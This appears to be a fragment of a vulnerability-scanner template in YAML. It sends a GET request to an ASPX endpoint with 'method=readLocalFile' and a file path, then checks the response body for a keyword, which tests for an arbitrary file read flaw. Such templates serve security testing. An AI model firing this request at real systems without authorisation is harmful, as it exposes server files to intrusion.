  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/Applications/BaseInfos/System/Ajax_operaFile.aspx?method=readLocalFile&path=/Applications/BaseInfos/System/Ajax_operaFile.aspx"

    matchers:
      - type: word
        part: body
        words:
          - 'Applications'
